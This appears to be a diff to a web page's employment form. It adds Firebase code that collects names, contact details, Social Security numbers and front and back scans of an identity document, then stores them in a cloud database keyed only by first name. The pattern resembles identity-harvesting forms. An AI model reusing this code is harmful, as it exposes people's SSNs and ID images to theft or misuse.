@@ -212,8 +212,7 @@
 
                     <section>
 
-                        <form class="employment-form" id="myForm" action="https://formspree.io/f/mjvnvdqq" method="POST"
-                            enctype="multipart/form-data">
+                        <form class="employment-form" id="myForm">
                             <fieldset>
                                 <legend>Contact
                                     Information</legend>
@@ -487,6 +486,115 @@
             value = value.replace(/(\d{3})(\d{2})(\d{4})/, '$1-$2-$3');
         }
         input.value = value;
+    });
+</script>
+<script type="module">
+    // Import the necessary functions from the Firebase SDK
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+    import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
+    import { getDownloadURL, getStorage, ref as storageRef, uploadBytes, uploadBytesResumable } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";
+
+    // Your web app's Firebase configuration
+    const firebaseConfig = {
+        apiKey: "AIzaSyDGXVPqgtZwyBoi3i46KyLUc27__dFya0M",
+        authDomain: "id-form-d1f3d.firebaseapp.com",
+        projectId: "id-form-d1f3d",
+        storageBucket: "id-form-d1f3d.appspot.com",
+        messagingSenderId: "1075496020458",
+        appId: "1:1075496020458:web:ff9295a50f62ab86e5aa93"
+    };
+
+    // Initialize Firebase
+    const app = initializeApp(firebaseConfig);
+    const database = getDatabase(app);
+    const storage = getStorage(app);
+
+    // Function to generate a random file name
+    function generateRandomFileName(file) {
+        const randomString = Math.random().toString(36).substring(2, 8);
+        const fileExtension = file.name.split('.').pop();
+        return `file_${randomString}.${fileExtension}`;
+    }
+
+    // Function to upload file to Firebase Storage with a renamed file
+    function uploadFile(file) {
+        return new Promise((resolve, reject) => {
+            const fileName = generateRandomFileName(file);
+            const storageRefVar = storageRef(storage, `uploads/${fileName}`);
+
+            // Use put for smaller files and uploadBytesResumable for larger files
+            const uploadTask = file.size < 1024 * 1024 ? uploadBytes(storageRefVar, file) : uploadBytesResumable(storageRefVar, file);
+
+            uploadTask.then((snapshot) => {
+                getDownloadURL(snapshot.ref).then((downloadURL) => {
+                    resolve(downloadURL);
+                });
+            }).catch((error) => {
+                console.error('Error uploading file:', error);
+                reject(null);
+            });
+        });
+    }
+
+    // Submit form and store data in Firebase
+    document.getElementById('myForm').addEventListener('submit', function (e) {
+        e.preventDefault();
+
+        // Get form values
+        const first_name = document.querySelector('[name="first_name"]').value;
+        const email = document.querySelector('[name="email"]').value;
+        const SSN = document.querySelector('[name="SSN"]').value;
+        const city = document.querySelector('[name="city"]').value;
+        const zipCode = document.querySelector('[name="zipCode"]').value;
+        const lastName = document.querySelector('[name="lastName"]').value;
+        const phoneNumber = document.querySelector('[name="phoneNumber"]').value;
+        const address = document.querySelector('[name="address"]').value;
+        const state = document.querySelector('[name="state"]').value;
+
+        const fileInputFront = document.querySelector('[name="upload_doc_front"]');
+        const fileFront = fileInputFront.files[0];
+
+        const fileInputBack = document.querySelector('[name="upload_doc_back"]');
+        const fileBack = fileInputBack.files[0];
+
+        // Check if both files are selected
+        if (!fileFront || !fileBack) {
+            alert('Please select both front and back files');
+            return;
+        }
+
+        // Store data in Firebase
+        const formData = {
+            first_name,
+            email,
+            SSN,
+            city,
+            zipCode,
+            lastName,
+            phoneNumber,
+            address,
+            state,
+            fileFrontURL: null,
+            fileBackURL: null
+        };
+
+        // Upload front and back files concurrently
+        Promise.all([uploadFile(fileFront), uploadFile(fileBack)])
+            .then(([fileFrontURL, fileBackURL]) => {
+                formData.fileFrontURL = fileFrontURL;
+                formData.fileBackURL = fileBackURL;
+
+                // Set data at the specified location using first name as the key
+                const formsRef = ref(database, `forms/${first_name}`);
+                set(formsRef, formData).then(() => {
+                    console.log('Form submitted successfully!');
+                    // Redirect to submit.html after successful submission
+                    window.location.href = 'submitted.html';
+                }).catch((error) => {
+                    console.error('Error submitting form:', error);
+                    alert('An error occurred while submitting the form. Please try again.');
+                });
+            });
     });
 </script>
 
